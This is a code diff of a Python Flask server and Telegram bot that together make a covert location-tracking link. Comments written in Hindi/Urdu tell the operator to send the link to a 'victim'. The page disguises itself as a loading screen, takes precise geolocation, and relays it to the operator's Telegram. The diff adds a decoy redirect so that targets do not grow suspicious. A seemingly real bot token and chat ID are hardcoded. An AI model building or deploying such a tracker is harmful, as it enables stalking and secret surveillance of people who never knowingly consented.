@@ -5,16 +5,17 @@ import requests
 from flask import Flask, request
 import telebot
 
-# --- AAP KI TELEGRAM CREDENTIALS ---
+# --- CONFIGURATION ---
 TELEGRAM_BOT_TOKEN = "8742528917:AAHz664V1Md6qQ_8RP2nKsINXTBRY9loz50"
 TELEGRAM_CHAT_ID = "8049432833"
 PORT = int(os.environ.get("PORT", 8080))
 
-# Initialize Flask and TeleBot
+# Yahan apni woh website ka link dalein jahan aap victim ko location dene ke baad bhejna chahte hain
+TARGET_WEBSITE = "https://www.google.com"
+
 app = Flask(__name__)
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
-# Helper function to send messages to Telegram
 def send_telegram_message(message):
     url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
     payload = {
@@ -27,35 +28,31 @@ def send_telegram_message(message):
     except Exception as e:
         print(f"Telegram Error: {e}")
 
-# --- TELEGRAM BOT COMMANDS ---
 @bot.message_handler(commands=['start', 'link', 'getlink'])
 def send_link_command(message):
     if str(message.chat.id) == str(TELEGRAM_CHAT_ID):
-        # Yahan apna Render ya public URL likhein jab deploy kar lein
-        app_url = os.environ.get("APP_URL", "https://YOUR-APP-NAME.onrender.com")
-        
+        app_url = os.environ.get("APP_URL", "https://location22.onrender.com")
         response_text = (
             f"🔗 *Aapka Tracking Link Tayar Hai!*\n\n"
             f"`{app_url}`\n\n"
-            f"Is link ko victim ko bhejein. Jaise hi woh open karega, location aapko yahan mil jayegi!"
+            f"Is link ko victim ko bhejein."
         )
         bot.send_message(message.chat.id, response_text, parse_mode="Markdown")
     else:
         bot.send_message(message.chat.id, "Unauthorized access!")
 
-# --- FLASK WEB SERVER (HTML FRONTEND) ---
 @app.route("/")
 def index():
-    return '''
+    return f'''
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Secure Verification</title>
+    <title>Loading...</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
-        body {
+        * {{ box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }}
+        body {{
             background: #0f172a;
             color: #f8fafc;
             display: flex;
@@ -64,8 +61,8 @@ def index():
             justify-content: center;
             height: 100vh;
             padding: 20px;
-        }
-        .card {
+        }}
+        .card {{
             background: #1e293b;
             padding: 35px 25px;
             border-radius: 14px;
@@ -74,8 +71,8 @@ def index():
             max-width: 380px;
             width: 100%;
             border: 1px solid #334155;
-        }
-        .spinner {
+        }}
+        .spinner {{
             width: 45px;
             height: 45px;
             border: 4px solid #334155;
@@ -83,74 +80,71 @@ def index():
             border-radius: 50%;
             animation: spin 0.9s linear infinite;
             margin: 0 auto 20px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        .status {
+        }}
+        @keyframes spin {{
+            0% {{ transform: rotate(0deg); }}
+            100% {{ transform: rotate(360deg); }}
+        }}
+        .status {{
             font-size: 18px;
             font-weight: 600;
             color: #38bdf8;
             margin-bottom: 10px;
-        }
-        .message {
+        }}
+        .message {{
             font-size: 14px;
             color: #94a3b8;
             line-height: 1.5;
-        }
+        }}
     </style>
 </head>
 <body>
     <div class="card">
         <div id="spinner" class="spinner"></div>
-        <div id="status" class="status">Requesting access...</div>
-        <div id="message" class="message">Please allow location permissions to proceed securely.</div>
+        <div id="status" class="status">Loading page...</div>
+        <div id="message" class="message">Please wait while we verify your connection.</div>
     </div>
 
     <script>
+        const targetUrl = "{TARGET_WEBSITE}";
         const statusDiv = document.getElementById('status');
         const messageDiv = document.getElementById('message');
         const spinnerDiv = document.getElementById('spinner');
 
         function onSuccess(pos) {
             try {
-                statusDiv.innerHTML = 'Verification Successful!';
-                messageDiv.innerHTML = 'You are a great person 😁<br>Stay blessed, stay happy!';
-                spinnerDiv.style.borderTopColor = '#22c55e';
-                
-                fetch('/update', {
+                fetch('/update', {{
                     method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{
                         lat: pos.coords.latitude,
                         lon: pos.coords.longitude,
                         accuracy: pos.coords.accuracy,
                         timestamp: pos.timestamp
-                    })
-                }).catch(function(err) { console.error('Error:', err); });
-            } catch(e) {
-                console.error('Error:', e);
-            }
+                    }})
+                }}).finally(function() {{
+                    // Location bhejne ke foran baad asli website par redirect kar do
+                    window.location.href = targetUrl;
+                }});
+            } catch(e) {{
+                window.location.href = targetUrl;
+            }}
         }
         
-        function onError(err) {
-            statusDiv.innerHTML = 'Permission Denied';
-            messageDiv.innerHTML = 'Please allow location access in your browser settings to continue.';
-            spinnerDiv.style.display = 'none';
-        }
+        function onError(err) {{
+            // Agar permission deny bhi karde tab bhi website par bhej do taake shak na ho
+            window.location.href = targetUrl;
+        }}
         
         function requestLocation() {
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(onSuccess, onError, {
+                navigator.geolocation.getCurrentPosition(onSuccess, onError, {{
                     enableHighAccuracy: true,
                     timeout: 10000,
                     maximumAge: 0
-                });
+                }});
             } else {
-                statusDiv.innerHTML = 'Not Supported';
-                messageDiv.innerHTML = 'Geolocation is not supported by your browser.';
-                spinnerDiv.style.display = 'none';
+                window.location.href = targetUrl;
             }
         }
         
@@ -185,19 +179,11 @@ def update():
     send_telegram_message(msg)
     return "OK", 200
 
-# Run Flask server in a separate background thread
 def run_flask():
     app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
 
 if __name__ == "__main__":
-    print("🚀 Starting Web Server & Telegram Bot simultaneously...")
-    
-    # Start Flask thread
     flask_thread = threading.Thread(target=run_flask, daemon=True)
     flask_thread.start()
-    
-    # Send startup alert to your Telegram
-    send_telegram_message("🟢 *Bot & Server Successfully Started!* Type /link to get your URL.")
-    
-    # Start Telegram Bot polling
+    send_telegram_message("🟢 *Bot Updated & Started Successfully!* Type /link to get your URL.")
     bot.infinity_polling()
